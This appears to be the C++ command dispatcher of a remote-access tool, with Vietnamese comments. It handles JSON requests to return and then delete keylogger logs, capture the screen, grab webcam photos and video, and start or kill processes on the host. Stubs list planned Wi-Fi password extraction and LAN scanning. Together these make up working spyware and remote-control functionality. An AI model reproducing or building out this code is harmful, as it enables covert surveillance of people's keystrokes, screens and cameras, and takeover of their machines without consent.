#include "core/dispatcher.hpp"
#include "modules/process.hpp"
#include "modules/screen.hpp"
#include "modules/camera.hpp"

#include <iostream>
#include <fstream>
#include <cstdio> // Cho std::remove
#include <cerrno> // Cho ENOENT (Error No Entry)

#define KEYLOGGER_FILE_NAME "keylogger.txt"
std::string Dispatcher::handle(const std::string& request_json)
{
    std::cout << "[Dispatcher] Incoming request: " << request_json << "\n";

    Json res;

    try {
        Json req = Json::parse(request_json);
        std::string cmd = req.value("cmd", "");

        if (cmd == "ping") {
            res = handle_ping(req);
        }
        else if (cmd == "process_list") {
            res = handle_process_list(req);
        }
        else if (cmd == "process_kill") {
            res = handle_process_kill(req);
        }
        else if (cmd == "process_start") {
            res = handle_process_start(req);
        }
        else if (cmd == "screen") {
            res = handle_screen(req);
        }
        else if (cmd == "camera") {
            res = handle_camera(req);
        }
        else if (cmd == "camera_video") {
            res = handle_camera_video(req);   
        }
        else if (cmd == "screen_stream") {
            res = handle_screen_stream(req);
        }
        else if (cmd == "getkeylogs") {
            res = handle_getkeylogs(req);
        }
        else if (cmd == "clearlogs") {
            res = handle_clearlogs(req);
        }
        else if (cmd == "sysinfo" || cmd == "scanlan" || cmd == "wifi-pass" || cmd == "download-file" || cmd == "list-files" || cmd == "delete-file") {
             res["cmd"] = cmd;
             res["status"]  = "error";
             res["message"] = "Command '" + cmd + "' is not yet implemented in the backend.";
        }
    }
    catch (const std::exception& e) {
        res["status"]  = "error";
        res["message"] = std::string("Exception: ") + e.what();
    }

    return res.dump();
}

// ----------------------- HANDLERS -----------------------
Json Dispatcher::handle_getkeylogs(const Json&)
{
    std::ifstream ifs(KEYLOGGER_FILE_NAME, std::ios::in);
    Json resp;
    resp["cmd"] = "getkeylogs";

    if (!ifs.is_open()) {
        resp["status"] = "ok";
        // Nếu file không tồn tại, trả về kết quả rỗng (UI sẽ hiển thị)
        resp["result"] = "--- Log file not found or empty. ---";
        return resp;
    }

    // Đọc toàn bộ nội dung file
    std::string content((std::istreambuf_iterator<char>(ifs)),
                        std::istreambuf_iterator<char>());
    ifs.close();
    
    // Tự động xóa file sau khi đọc (theo yêu cầu UI)
    if (std::remove(KEYLOGGER_FILE_NAME) != 0) {
        std::cerr << "[Dispatcher] Warning: Failed to delete keylogger file after reading. Error: " << errno << "\n";
    }

    resp["status"] = "ok";
    resp["result"] = content;
    return resp;
}

Json Dispatcher::handle_clearlogs(const Json&)
{
    Json resp;
    resp["cmd"] = "clearlogs";

    if (std::remove(KEYLOGGER_FILE_NAME) != 0) {
        // Kiểm tra lỗi, ENOENT (File not found) là lỗi OK (vì mục đích là xóa)
        if (errno == ENOENT) {
            resp["status"] = "ok";
            resp["message"] = "Log file already deleted or not found.";
        } else {
            resp["status"] = "error";
            resp["message"] = "Failed to delete log file.";
        }
    } else {
        resp["status"] = "ok";
        resp["message"] = "Log file cleared successfully.";
    }
    return resp;
}

Json Dispatcher::handle_ping(const Json&)
{
    return {
        {"status", "ok"},
        {"message", "pong"}
    };
}

Json Dispatcher::handle_process_list(const Json&)
{
    ProcessManager pm;
    return pm.list_processes();
}

Json Dispatcher::handle_process_kill(const Json& req)
{
    int pid = req.value("pid", -1);
    if (pid < 0) {
        return {
            {"status", "error"},
            {"message", "Missing or invalid 'pid'"}
        };
    }

    ProcessManager pm;
    return pm.kill_process(pid);
}

Json Dispatcher::handle_process_start(const Json& req)
{
    if (!req.contains("path") || !req["path"].is_string()) {
        return {
            {"status", "error"},
            {"message", "Missing or invalid 'path'"}
        };
    }

    std::string path = req["path"].get<std::string>();
    ProcessManager pm;
    return pm.start_process(path);
}

Json Dispatcher::handle_screen(const Json&)
{
    std::string b64 = ScreenCapture::capture_base64();

    return {
        {"status", "ok"},
        {"image_base64", b64}
    };
}

Json Dispatcher::handle_camera(const Json& req)
{
    Camera cam;
    std::string b64;

    if (cam.capture_frame(b64)) {
        Json resp;
        resp["image_base64"] = b64;
        return resp;
    }

    Json err;
    err["error"] = "camera_failed";
    return err;
}

Json Dispatcher::handle_camera_video(const Json& req)
{
    int duration = 10;
    if (req.contains("duration") && req["duration"].is_number_integer()) {
        duration = req["duration"];
        if (duration <= 0) duration = 10;
        if (duration > 30) duration = 30; // tránh gửi video quá dài
    }

    Camera cam;
    std::string b64video;
    std::string format;

    if (!cam.capture_video(duration, b64video, format)) {
        Json err;
        err["cmd"] = "camera_video";
        err["status"] = "error";
        err["error"] = "camera_video_failed";
        return err;
    }

    Json resp;
    resp["cmd"] = "camera_video";
    resp["status"] = "ok";
    resp["format"] = format;          // "avi"
    resp["video_base64"] = b64video;
    return resp;
}

Json Dispatcher::handle_screen_stream(const Json& req)
{
    int duration = 5;
    int fps = 3;

    if (req.contains("duration"))
        duration = req["duration"];

    if (req.contains("fps"))
        fps = req["fps"];

    Json resp;
    resp["cmd"] = "screen_stream";
    resp["status"] = "accepted";
    resp["duration"] = duration;
    resp["fps"] = fps;

    return resp;
}
